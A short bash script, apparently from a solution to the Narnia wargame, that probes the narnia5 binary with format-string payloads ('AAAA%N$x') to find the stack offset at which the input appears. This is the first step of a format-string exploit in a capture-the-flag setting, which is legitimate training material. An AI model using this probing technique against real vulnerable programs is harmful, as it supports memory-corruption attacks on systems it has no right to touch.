#!/bin/bash

for num in {1..30} 
do
    payload="AAAA%$num\$x"
    output=$(/narnia/narnia5 "$payload" 2>/dev/null)
    if echo "$output" | grep -q "41414141"; then
        echo "Found at position: $num"
        echo "$payload"
        echo "Output: $output"
        break
    fi
done